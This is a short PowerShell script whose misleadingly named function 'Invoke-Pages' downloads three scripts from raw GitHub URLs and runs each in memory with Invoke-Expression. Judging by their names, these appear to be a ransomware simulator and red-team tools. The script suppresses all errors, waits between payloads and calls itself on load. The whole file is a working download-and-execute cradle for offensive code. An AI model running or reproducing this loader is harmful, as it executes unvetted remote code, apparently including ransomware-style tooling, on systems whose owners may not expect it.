function Invoke-Pages {

$URLs = @(
    'https://raw.githubusercontent.com/MajesticBear01/RanEnc/refs/heads/main/RanSim.ps1',
    'https://raw.githubusercontent.com/MajesticBear01/RedTeaming/refs/heads/main/CRaider.ps1',
    'https://raw.githubusercontent.com/MajesticBear01/RedTeaming/refs/heads/main/KittyCat.ps1'
)


foreach ($URL in $URLs) {
    try {
        $ScriptBytes = Invoke-WebRequest -Uri $URL -UseBasicParsing -Method Get -MaximumRedirection 0
        
        Invoke-Expression -Command $ScriptBytes.Content
	Start-Sleep 15
    } catch {

    }
}
}



#Call the page function
Invoke-Pages
